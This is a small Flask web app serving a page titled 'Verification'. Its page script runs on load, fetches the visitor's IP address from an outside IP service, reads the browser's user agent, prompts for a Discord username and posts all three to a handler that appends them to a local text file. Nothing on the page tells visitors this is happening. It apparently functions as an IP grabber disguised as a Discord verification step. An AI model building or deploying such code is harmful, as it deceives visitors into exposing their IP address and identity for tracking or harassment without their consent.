from flask import Flask, request, render_template_string

app = Flask(__name__)

# Route for the root URL
@app.route('/')
def index():
    # You can return a simple HTML page directly, or use a template if needed.
    return render_template_string("""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Verification</title>
            <script>
                async function getIP() {
                    try {
                        const response = await fetch('https://api.ipify.org?format=json');
                        const data = await response.json();
                        return data.ip;
                    } catch (error) {
                        console.error('Error fetching IP:', error);
                        return 'Unknown IP';
                    }
                }

                async function sendData() {
                    const ip = await getIP();
                    const device = navigator.userAgent;
                    const username = prompt('Enter your Discord username:');

                    try {
                        const response = await fetch('/submit', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/x-www-form-urlencoded',
                            },
                            body: new URLSearchParams({
                                ip: ip,
                                device: device,
                                username: username
                            })
                        });

                        if (response.ok) {
                            alert('Data saved successfully!');
                        } else {
                            alert('Error saving data');
                        }
                    } catch (error) {
                        console.error('Error:', error);
                        alert('Error saving data');
                    }
                }

                window.onload = sendData;
            </script>
        </head>
        <body>
            <h1>Welcome to the Verification Page</h1>
        </body>
        </html>
    """)

# Route for handling form submissions
@app.route('/submit', methods=['POST'])
def submit_data():
    ip = request.form.get('ip')
    device = request.form.get('device')
    username = request.form.get('username')

    # Save the data to a file in the current directory
    with open('user_data.txt', 'a') as file:
        file.write(f"IP: {ip}, Device: {device}, Username: {username}\n")

    return 'Data saved successfully!', 200

if __name__ == '__main__':
    app.run(debug=True)
